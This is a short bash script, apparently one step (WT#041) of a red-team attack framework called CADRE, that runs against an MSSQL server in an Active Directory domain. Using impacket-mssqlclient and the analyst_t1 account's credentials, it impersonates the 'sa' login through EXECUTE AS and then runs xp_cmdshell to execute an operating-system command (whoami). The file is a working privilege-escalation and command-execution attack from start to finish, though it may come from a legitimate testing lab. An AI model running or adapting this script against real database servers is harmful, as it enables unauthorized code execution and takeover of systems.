#!/bin/bash
# CADRE — WT#041 MSSQL xp_cmdshell
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#041 — MSSQL xp_cmdshell"
start_attack "041" "MSSQL xp_cmdshell"

require_tool impacket-mssqlclient
require_env MBR01 "MBR01"
require_env DOMAIN_CHILD "DOMAIN_CHILD"

step "EXECUTE AS sa then xp_cmdshell (analyst_t1 IMPERSONATE chain)"
run_cmd "SQLF=\$(mktemp); printf '%s\\n' \"EXECUTE AS LOGIN = 'sa';\" \"EXEC xp_cmdshell 'whoami';\" > \"\$SQLF\"; timeout 45 impacket-mssqlclient \"${DOMAIN_CHILD}/analyst_t1:${MSSQL_PASS}@${MBR01}\" -windows-auth -file \"\$SQLF\"; RC=\$?; rm -f \"\$SQLF\"; exit \$RC"

result $? "MSSQL xp_cmdshell completed"
